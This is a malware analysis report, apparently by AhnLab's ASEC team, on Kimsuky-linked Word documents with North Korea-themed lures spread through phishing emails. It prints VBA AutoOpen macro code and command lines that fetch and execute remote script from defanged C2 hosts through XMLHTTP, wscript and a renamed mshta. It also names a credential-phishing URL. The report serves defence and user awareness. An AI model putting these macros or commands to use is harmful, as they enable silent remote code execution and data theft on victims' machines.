The ASEC analysis team has discovered the continuous distribution of malicious Word files
with North Korea-related materials. The types of discovered Word files included the one
discussed in the “Overall Organizational Analysis Report of 2021 Kimsuky Attack Word
Files” (AhnLab TIP) and ‘Word Files Related to Diplomacy and National Defense Being
Distributed‘. Also, there was also a type using mshta.
The malicious Word files are distributed in various names as shown below.
CV of Kim **(Korean American Organization of **,220711).doc
Yang**_** Foundation interim report(220716).doc
Consultation Request.doc
Type 1
The malicious Word file titled ‘Consultation Request.doc’ was most likely distributed through
the email shown below. The attacker impersonated a person from a Korean organization to
send an email requesting a consultation for a report.

1/8

First attack email (without attachments)
The first attack email does not have any attachments. Only when a user responds favorably
to the email does the attacker sends a reply with a URL for the user to download a malicious
Word file.

2/8

Attacker’s reply when a user declined the request (no URL included)

Second attack email sent when a user accepted the request (URL for downloading a Word
file included)

3/8

Clicking the link on the second email will display a webpage containing another malicious
URL.

Webpage prompting users to access another malicious URL
Clicking the download button will redirect the user to
hxxps://accounts.serviceprotect[.]eu/signin/v2/identifier?hl=kr&passive=true&
<omitted>rtnurl=aHR0cHM6Ly9kb2NzLmdv<omitted>. The URL cannot be currently
accessed. Yet judging from the URL, it is likely that it collected login information of users and
downloaded a malicious Word file from the rtnurl parameter value.
Opening the Word file will show an image asking users to enable macros by clicking the
Enable Content button. If users comply, the file displays texts related to a consultation
request, making it difficult to realize its malicious features.

Prompting users to enable content

5/8

The file contains a VBA macro that connects to a certain URL. Here are some parts of the
macro code below.
Sub <strong>Reserve</strong>(pth)
Documents.Add
cnt = "On Error Resume Next:Set mx = CreateObje" &
"ct(""Microsoft.XMLHTTP""):mx.open ""GET"",
""hxxp://asssambly.mywebcommunity[.]org/file/upload/list.php?query=1"",
False:mx.Send:Execute(mx.responseText)"
Sub <strong>AutoOpen</strong>()
On Error Resume Next
pw = "1qaz2wsx"
Weed pw
obt = "winmgmts:win32_process"
Set wm = <strong>GetObject</strong>(obt)
pth = <strong>Templates</strong>(1).Path & "\version.ini"
cd = "wscript.exe //e:vbscript //b"
wm.Create cd & pth
End Sub

6/8

When the macro is run, it creates version.ini in the AppData\Roaming\Microsoft\Templates
folder. It then runs the created ini file through wscript.exe.
wscript.exe //e:vbscript //b %AppData%\Microsoft\Templates\version.ini
On Error Resume Next:Set mx = CreateObject("Microsoft.XMLHTTP"):mx.open "GET",
"hxxp://asssambly.mywebcommunity[.]org/file/upload/list.php?query=1",
False:mx.Send:Execute(mx.responseText)

version.ini
As the URL cannot be currently accessed, it is impossible to know what the macro does
after. It likely engaged in malicious behaviors such as leaking user PC information as
mentioned in the previous post ‘Word Document Attack Targeting Companies
Specialized in Carbon Emissions‘.
Type 2
Type 2 is distributed with a file related to a specific webinar and accesses C2 through mshta.
Similar to Type 1, the Word file shows an image prompting users to enable macros. If users
do so, the file shows a following text related to the webinar with a topic of North Korea.

The file also contains a VBA macro, which is shown below.
7/8

Sub <strong>AutoOpen</strong>()
jsfds = "cmd /c copy %windir%\system32\mshta.exe %tmp%\gtfmon.exe"
Shell jsfds, 0
jsfds = "cmd /c timeout /t 7 >NUL && %tmp%\gtfmon.exe
hxxp://freunkown1.sportsontheweb[.]net/h.php"
Shell jsfds, 0
End Sub

When the macro is run, it copies mshta.exe in the TEMP folder as gtfmon.exe and attempts
to access a certain URL using the cmd command.
cmd /c timeout /t 7 >NUL && %tmp%\gtfmon.exe
hxxp://freunkown1.sportsontheweb[.]net/h.php
Again, the URL cannot be currently accessed and further behaviors cannot be confirmed.
Similar to Type 1, the macro likely performed malicious behaviors such as leaking user PC
information.
As malicious Word files containing North Korea-related materials are continuously being
discovered, users need to take caution. Since attackers are distributing malicious files by
impersonating normal users, one should check the email address of the sender and take
caution when opening attachments and clicking links.
